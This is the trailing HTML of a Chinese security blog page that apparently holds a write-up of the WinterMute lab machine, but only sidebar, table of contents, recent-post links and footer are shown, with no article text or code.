class="title">Lampiao-1</div></div></a></div><div><a href="/article/Raven-1/" title="Raven-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-30</div><div class="title">Raven-1</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/tx.png" onerror="this.onerror=null;this.src='/img/sddd.gif'" alt="avatar"/></div><div class="author-info__name">Creexile</div><div class="author-info__description">Don't walk with waning motive.</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">90</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">106</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">WinterMute: 1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-number">1.3.</span> <span class="toc-text">getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-v2"><span class="toc-number">1.4.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.5.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">1.6.</span> <span class="toc-text">横向移动</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-v3"><span class="toc-number">1.7.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83-v2"><span class="toc-number">1.8.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E5%BD%95"><span class="toc-number">1.9.</span> <span class="toc-text">附录</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/Kioptrix-1-2/" title="Kioptrix-1.2">Kioptrix-1.2</a><time datetime="2025-07-26T14:40:56.500Z" title="Updated 2025-07-26 22:40:56">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/12855/" title="Python原型链污染">Python原型链污染</a><time datetime="2025-07-26T14:36:57.574Z" title="Updated 2025-07-26 22:36:57">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/xss-labs/" title="xss-labs">xss-labs</a><time datetime="2025-07-26T14:36:12.925Z" title="Updated 2025-07-26 22:36:12">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/xss/" title="XSS">XSS</a><time datetime="2025-07-26T14:35:45.178Z" title="Updated 2025-07-26 22:35:45">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/jarbas-1/" title="jarbas-1">jarbas-1</a><time datetime="2025-07-26T14:13:02.073Z" title="Updated 2025-07-26 22:13:02">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/vulnstack-5/" title="VulnStack-红日5">VulnStack-红日5</a><time datetime="2025-07-26T13:23:05.723Z" title="Updated 2025-07-26 21:23:05">2025-07-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By Creexile</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async src="/js/custom.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
